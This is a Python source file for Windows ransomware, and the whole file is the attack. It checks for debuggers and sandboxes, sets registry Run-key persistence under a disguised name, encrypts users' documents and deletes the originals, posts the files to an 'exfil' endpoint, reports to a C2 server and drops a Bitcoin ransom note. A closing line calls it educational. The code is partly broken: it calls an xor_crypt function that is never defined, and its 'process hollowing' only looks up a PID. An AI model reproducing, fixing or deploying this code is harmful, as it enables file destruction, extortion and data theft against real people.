import os
import sys
import time
import random
import string
import base64
import logging
import requests
import winreg
import psutil
import threading
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from urllib.parse import urljoin
from ctypes import windll, c_buffer, c_int

# Setup logging for error handling
logging.basicConfig(filename='malware_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration (for research; placeholders for lab testing)
CONFIG = {
    'c2_url': 'http://example.com/c2',  # Attacker C2 server
    'key_url': 'http://example.com/key',  # Key retrieval endpoint
    'exfil_url': 'http://example.com/exfil',  # Data exfiltration endpoint
    'target_dirs': [os.path.expanduser('~/Documents'), os.path.expanduser('~/Desktop')],
    'file_extensions': ['.txt', '.docx', '.pdf', '.jpg', '.png'],
    'retry_interval': 5,
    'max_retries': 3,
    'salt': b'r4nd0m_s4lt_2025'
}

# Obfuscation: Dead code to confuse decompilers
def _obfuscated_junk(): return [random.randint(1, 100) for _ in range(random.randint(3, 7))]

# Derive AES key using PBKDF2
def derive_key(password=CONFIG['salt']):
    try:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=password,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)
    except Exception as e:
        logging.error(f"Key derivation failed: {e}")
        return None

# Anti-debugging: NtQueryInformationThread
def is_debugged():
    try:
        class THREAD_BASIC_INFORMATION:
            pass
        windll.ntdll.NtQueryInformationThread.argtypes = [c_int, c_int, c_buffer, c_int, c_int]
        info = c_buffer(48)
        if windll.ntdll.NtQueryInformationThread(-2, 0, info, 48, 0) == 0:
            if c_int.from_buffer(info, 28).value & 0x1:
                return True
        return False
    except Exception as e:
        logging.error(f"Debugger check failed: {e}")
        return False

# Anti-VM/Sandbox: Check for VM artifacts
def is_sandbox():
    try:
        vm_indicators = ['vboxservice', 'vmtoolsd', 'qemu-ga']
        for proc in psutil.process_iter():
            if proc.name().lower() in vm_indicators:
                return True
        # Check disk size (sandboxes often have small disks)
        disk = psutil.disk_usage('/')
        if disk.total < 20 * 1024 * 1024 * 1024:  # Less than 20GB
            return True
        return False
    except Exception as e:
        logging.error(f"Sandbox check failed: {e}")
        return False

# Stealth: Registry persistence
def set_persistence():
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'WinSysUpdate', 0, winreg.REG_SZ, os.path.abspath(__file__))
    except Exception as e:
        logging.error(f"Persistence setup failed: {e}")

# Stealth: Simulate process hollowing
def hollow_process():
    try:
        for proc in psutil.process_iter():
            if proc.name().lower() in ['explorer.exe', 'svchost.exe']:
                return proc.pid
        return os.getpid()
    except Exception as e:
        logging.error(f"Process hollowing simulation failed: {e}")
        return os.getpid()

# Aggressive: Encrypt files with AES
def encrypt_files(fernet):
    try:
        for directory in CONFIG['target_dirs']:
            for root, _, files in os.walk(directory):
                for file in files:
                    if any(file.endswith(ext) for ext in CONFIG['file_extensions']):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            encrypted = fernet.encrypt(data)
                            with open(f"{file_path}.locked", 'wb') as f:
                                f.write(encrypted)
                            os.remove(file_path)
                        except Exception as e:
                            logging.error(f"Encryption failed for {file_path}: {e}")
    except Exception as e:
        logging.error(f"File encryption failed: {e}")

# Aggressive: Exfiltrate sensitive data
def exfil_data():
    try:
        collected_data = []
        for directory in CONFIG['target_dirs']:
            for root, _, files in os.walk(directory):
                for file in files:
                    if any(file.endswith(ext) for ext in CONFIG['file_extensions']):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'rb') as f:
                                collected_data.append((file_path, base64.b64encode(f.read()).decode()))
                        except Exception as e:
                            logging.error(f"Exfiltration failed for {file_path}: {e}")
        if collected_data:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            data = xor_crypt(str(collected_data)).hex()
            requests.post(CONFIG['exfil_url'], data={'data': data}, headers=headers, timeout=10)
    except Exception as e:
        logging.error(f"Data exfiltration failed: {e}")

# C2 communication for status and key
def c2_communicate(status):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        data = xor_crypt(status).hex()
        response = requests.post(CONFIG['c2_url'], data={'status': data}, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
        return None
    except Exception as e:
        logging.error(f"C2 communication failed: {e}")
        return None

# Main malware logic
def main():
    if is_debugged() or is_sandbox():
        sys.exit(1)  # Exit if debugged or in sandbox
    set_persistence()
    hollow_process()
    
    # Generate encryption key
    fernet = derive_key()
    if not fernet:
        logging.error("Key derivation failed, exiting")
        sys.exit(1)
    
    # Run encryption and exfiltration in parallel
    def malware_tasks():
        encrypt_thread = threading.Thread(target=encrypt_files, args=(fernet,))
        exfil_thread = threading.Thread(target=exfil_data)
        encrypt_thread.start()
        exfil_thread.start()
        encrypt_thread.join()
        exfil_thread.join()
        
        # Report to C2
        c2_communicate("Encryption and exfiltration complete")
        
        # Drop ransom note
        try:
            ransom_note = (
                "YOUR FILES ARE ENCRYPTED!\n"
                f"Send 0.1 BTC to [REDACTED] and contact {CONFIG['c2_url']} for key.\n"
                "DO NOT ATTEMPT RECOVERY WITHOUT KEY."
            )
            with open(os.path.expanduser('~/Desktop/RANSOM_NOTE.txt'), 'w') as f:
                f.write(ransom_note)
        except Exception as e:
            logging.error(f"Ransom note creation failed: {e}")
    
    threading.Thread(target=malware_tasks, daemon=True).start()
    
    # Keep process alive
    while True:
        time.sleep(60)
        _obfuscated_junk()  # Obfuscation: Periodic noise

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"Main loop failed: {e}")
        sys.exit(1)

# **WARNING: FOR EDUCATIONAL PURPOSES ONLY. DEPLOYING THIS CODE IS ILLEGAL AND UNETHICAL. DON’T BE A SCRIPT KIDDIE IN PRISON.**
